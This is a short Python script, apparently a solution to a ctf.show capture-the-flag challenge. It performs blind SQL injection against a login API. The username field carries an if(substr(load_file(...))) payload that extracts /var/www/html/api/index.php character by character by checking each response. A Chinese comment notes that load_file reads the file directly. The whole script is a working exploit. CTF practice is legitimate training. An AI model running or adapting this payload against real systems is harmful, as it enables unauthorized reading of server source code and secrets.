import requests

url = "http://5c4797b5-773b-4f68-ae82-32172f3253d3.challenge.ctf.show/api/"

result = ""

for i in range(257,10000):
    for j in "}{-abcdefg0123456789":
        data = {
            "username": f"if(substr(load_file('/var/www/html/api/index.php'),{i},1)=('{j}'),1,0)",
            "password": "0"
        }
        r = requests.post(url=url,data=data)
        #print(r.text)
        if r.text.find('u67e5') > 0:
            result += j
            print(result)
            break
    print(f"-------i={i}----next------")


#load_file 函数直接读取index.php的内容 ps：调代码调的快崩溃 2025.3.13